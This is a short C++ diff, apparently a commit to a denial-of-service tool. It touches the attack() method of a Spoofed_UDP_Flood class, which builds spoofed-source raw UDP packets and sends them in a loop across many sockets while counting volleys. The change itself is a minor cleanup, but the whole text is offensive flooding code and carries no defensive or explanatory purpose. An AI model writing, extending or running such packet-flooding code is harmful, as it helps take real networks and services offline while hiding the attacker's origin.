@@ -11,7 +11,6 @@
 #include "../Headers/Logging.hpp"
 
 void Spoofed_UDP_Flood::attack() {
-    int r;
     std::vector<int> sockets;
     sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     for (int x = 0; x < conf->CONNECTIONS; x++) {
@@ -69,13 +68,10 @@ void Spoofed_UDP_Flood::attack() {
             udp->check = csum( (unsigned short*) pseudogram , psize);
 
 
-            if((r = static_cast<int>(sendto(sockets[x], buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)))) == -1){
+            if((static_cast<int>(sendto(sockets[x], buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)))) == -1) {
                 close(sockets[x]);
                 sockets[x] = make_socket(IPPROTO_UDP);
-            }else{
-                conf->voly++;
             }
-
             delete pseudogram;
         }
         conf->voly++;
